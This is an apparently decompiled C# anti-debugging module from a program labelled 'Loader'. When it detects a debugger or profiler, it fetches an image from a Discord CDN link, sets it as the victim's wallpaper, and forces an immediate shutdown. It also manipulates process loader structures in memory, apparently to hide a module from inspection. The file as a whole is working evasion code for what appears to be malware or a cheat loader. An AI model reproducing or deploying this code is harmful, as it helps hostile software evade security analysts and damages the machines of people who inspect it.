using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Loader.Security.AntiDebug
{
	// Token: 0x02000031 RID: 49
	internal class Anti_Dbg
	{
		// Token: 0x06000326 RID: 806
		[DllImport("ntdll.dll", CharSet = CharSet.Auto)]
		private static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);

		// Token: 0x06000327 RID: 807 RVA: 0x00023F80 File Offset: 0x00022380
		public static void Initialize()
		{
			bool flag = Debugger.IsLogging();
			if (flag)
			{
				Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
				Process.Start("shutdown", "/s /t 0");
				Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false
				});
				Environment.Exit(0);
			}
			bool isAttached = Debugger.IsAttached;
			if (isAttached)
			{
				Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
				Process.Start("shutdown", "/s /t 0");
				Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false
				});
				Environment.Exit(0);
			}
			bool flag2 = Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null;
			if (flag2)
			{
				Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
				Process.Start("shutdown", "/s /t 0");
				Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false
				});
				Environment.Exit(0);
			}
			bool flag3 = string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0;
			if (flag3)
			{
				Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
				Process.Start("shutdown", "/s /t 0");
				Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false
				});
				Environment.Exit(0);
			}
			bool flag4 = Environment.OSVersion.Platform != PlatformID.Win32NT;
			if (!flag4)
			{
				int[] array = new int[6];
				int num = 0;
				IntPtr intPtr = Process.GetCurrentProcess().Handle;
				bool flag5 = Anti_Dbg.NtQueryInformationProcess(intPtr, 31, array, 4, ref num) == 0 && array[0] != 1;
				if (flag5)
				{
					Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
					Process.Start("shutdown", "/s /t 0");
					Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
					{
						CreateNoWindow = true,
						UseShellExecute = false
					});
					Environment.Exit(0);
				}
				bool flag6 = Anti_Dbg.NtQueryInformationProcess(intPtr, 30, array, 4, ref num) == 0 && array[0] != 0;
				if (flag6)
				{
					Anti_Dbg.Wallpaper.Set("https://cdn.discordapp.com/attachments/930101655779815464/944339150507745330/nah.png", Anti_Dbg.Wallpaper.Style.Fill);
					Process.Start("shutdown", "/s /t 0");
					Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
					{
						CreateNoWindow = true,
						UseShellExecute = false
					});
					Environment.Exit(0);
				}
				bool flag7 = Anti_Dbg.NtQueryInformationProcess(intPtr, 0, array, 24, ref num) != 0;
				if (!flag7)
				{
					intPtr = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr)array[1], 12), 12);
					Marshal.WriteInt32(intPtr, 32, 0);
					IntPtr intPtr2 = Marshal.ReadIntPtr(intPtr, 0);
					IntPtr ptr = intPtr2;
					do
					{
						ptr = Marshal.ReadIntPtr(ptr, 0);
						bool flag8 = Marshal.ReadInt32(ptr, 44) != 1572886 || Marshal.ReadInt32(Marshal.ReadIntPtr(ptr, 48), 0) != 7536749;
						if (!flag8)
						{
							IntPtr intPtr3 = Marshal.ReadIntPtr(ptr, 8);
							IntPtr intPtr4 = Marshal.ReadIntPtr(ptr, 12);
							Marshal.WriteInt32(intPtr4, 0, (int)intPtr3);
							Marshal.WriteInt32(intPtr3, 4, (int)intPtr4);
						}
					}
					while (!ptr.Equals(intPtr2));
				}
			}
		}

		// Token: 0x02000032 RID: 50
		public sealed class Wallpaper
		{
			// Token: 0x06000329 RID: 809 RVA: 0x0001C910 File Offset: 0x0001AD10
			private Wallpaper()
			{
			}

			// Token: 0x0600032A RID: 810
			[DllImport("user32.dll", CharSet = CharSet.Auto)]
			private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

			// Token: 0x0600032B RID: 811 RVA: 0x000242F8 File Offset: 0x000226F8
			public static void Set(string url, Anti_Dbg.Wallpaper.Style style)
			{
				Stream stream = new WebClient().OpenRead(url);
				Image image = Image.FromStream(stream);
				string text = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
				image.Save(text, ImageFormat.Bmp);
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
				bool flag = style == Anti_Dbg.Wallpaper.Style.Fill;
				if (flag)
				{
					registryKey.SetValue("WallpaperStyle", 10.ToString());
					registryKey.SetValue("TileWallpaper", 0.ToString());
				}
				bool flag2 = style == Anti_Dbg.Wallpaper.Style.Fit;
				if (flag2)
				{
					registryKey.SetValue("WallpaperStyle", 6.ToString());
					registryKey.SetValue("TileWallpaper", 0.ToString());
				}
				bool flag3 = style == Anti_Dbg.Wallpaper.Style.Span;
				if (flag3)
				{
					registryKey.SetValue("WallpaperStyle", 22.ToString());
					registryKey.SetValue("TileWallpaper", 0.ToString());
				}
				bool flag4 = style == Anti_Dbg.Wallpaper.Style.Stretch;
				if (flag4)
				{
					registryKey.SetValue("WallpaperStyle", 2.ToString());
					registryKey.SetValue("TileWallpaper", 0.ToString());
				}
				bool flag5 = style == Anti_Dbg.Wallpaper.Style.Tile;
				if (flag5)
				{
					registryKey.SetValue("WallpaperStyle", 0.ToString());
					registryKey.SetValue("TileWallpaper", 1.ToString());
				}
				bool flag6 = style == Anti_Dbg.Wallpaper.Style.Center;
				if (flag6)
				{
					registryKey.SetValue("WallpaperStyle", 0.ToString());
					registryKey.SetValue("TileWallpaper", 0.ToString());
				}
				Anti_Dbg.Wallpaper.SystemParametersInfo(20, 0, text, 3);
			}

			// Token: 0x04000286 RID: 646
			private const int SPI_SETDESKWALLPAPER = 20;

			// Token: 0x04000287 RID: 647
			private const int SPIF_UPDATEINIFILE = 1;

			// Token: 0x04000288 RID: 648
			private const int SPIF_SENDWININICHANGE = 2;

			// Token: 0x02000033 RID: 51
			public enum Style
			{
				// Token: 0x0400028A RID: 650
				Fill,
				// Token: 0x0400028B RID: 651
				Fit,
				// Token: 0x0400028C RID: 652
				Span,
				// Token: 0x0400028D RID: 653
				Stretch,
				// Token: 0x0400028E RID: 654
				Tile,
				// Token: 0x0400028F RID: 655
				Center
			}
		}
	}
}
